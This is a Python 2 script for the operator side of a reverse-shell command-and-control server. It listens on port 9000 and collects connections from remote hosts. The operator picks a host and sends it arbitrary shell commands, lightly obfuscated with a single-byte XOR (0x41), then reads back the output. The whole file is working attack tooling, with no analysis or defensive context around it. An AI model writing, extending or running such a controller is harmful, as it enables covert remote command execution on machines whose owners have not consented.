#!/usr/bin/python

import socket
from thread import *
import sys

def conn_accept(sock,handler):
    while True:
        (client, (ip,port)) = sock.accept()
        handler.add_host(client,(ip,port))

def list_root_commands():
    print ("List of Server Commands")
    print ("$List_Commands -> Display this list")
    print ("$List_Hosts -> Display connected hosts")
    print ("$Choose_Host host_no -> Select host from list")
    print ("$Exit -> Exit this program")

def list_connected_commands():
    print ("List of Commands when Host is Selected")
    print ("$List_Commands -> Display this list")
    print ("$Close_Connection -> Close Connection and remove host")
    print ("$Exit -> Exit to the main interface")

class rev_shell_client_main():
    list_of_hosts = []
    def __init__(self):
        list_of_hosts = []

    def add_host(self, host, tup):
        self.list_of_hosts.append([host,tup])

    def remove_host(self, host_id):
        self.list_of_hosts.remove(self.list_of_hosts[host_id])

    def return_list_of_hosts(self):
        return self.list_of_hosts

#Start Here!
try:
    max_conns = int(sys.argv[1])
except:
    max_conns = 5

command_dict = {"List_Commands":0,"List_Hosts":1,"Choose_Host":2,"Exit":3}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0",9000))
s.listen(max_conns)

handler = rev_shell_client_main()
start_new_thread(conn_accept,(s,handler))

list_root_commands()
while True:
    comm_body = ""
    comm_args = []
    cur_host_ip = ""
    cur_host_id = 0
    command = raw_input("~$ ")
    command = command.split(" ")
    comm_body = command[0]

    #Future Commands may require more than one args
    for i in range(1,len(command)):
        comm_args.append(command[i])
    try:
        translated = command_dict[comm_body]
    except:
        print ("Command not recognised! Try List_Commands for help")
        continue
    if translated == 0:
        list_root_commands()
    elif translated == 1:
        active_hosts = handler.return_list_of_hosts()
        for i in range(len(active_hosts)):
            print ("["+str(i)+"] "+active_hosts[i][1][0]+":"+str(active_hosts[i][1][1]))
    elif translated == 2:
        try:
            cur_host_id = int(comm_args[0])
        except:
            print ("Argument missing or not int")
            continue
        active_hosts = handler.return_list_of_hosts()
        try:
            cur_host_ip = active_hosts[cur_host_id][1][0]
            cur_host_con = active_hosts[cur_host_id][0]
        except:
            print ("Host ID out of bounds")
            continue
        list_connected_commands()
        while True:
            command = raw_input("["+cur_host_ip+"]~$ ")
            if command == "List_Commands":
                list_connected_commands()
            elif command == "Close_Connection":
                cur_host_con.close()
                handler.remove_host(cur_host_id)
                break
            elif command == "Exit":
                break
            encode = bytearray(command)
            for i in range(len(encode)):
                encode[i] ^=0x41
            try:
                cur_host_con.send(encode)
                en_data = cur_host_con.recv(3072)
                decode = bytearray(en_data)
                for i in range(len(decode)):
                    decode[i] ^=0x41
                print (decode)
            except:
                print ("Connection closed by client")
                handler.remove_host(cur_host_id)
                break
    elif translated == 3:
        sys.exit()
    
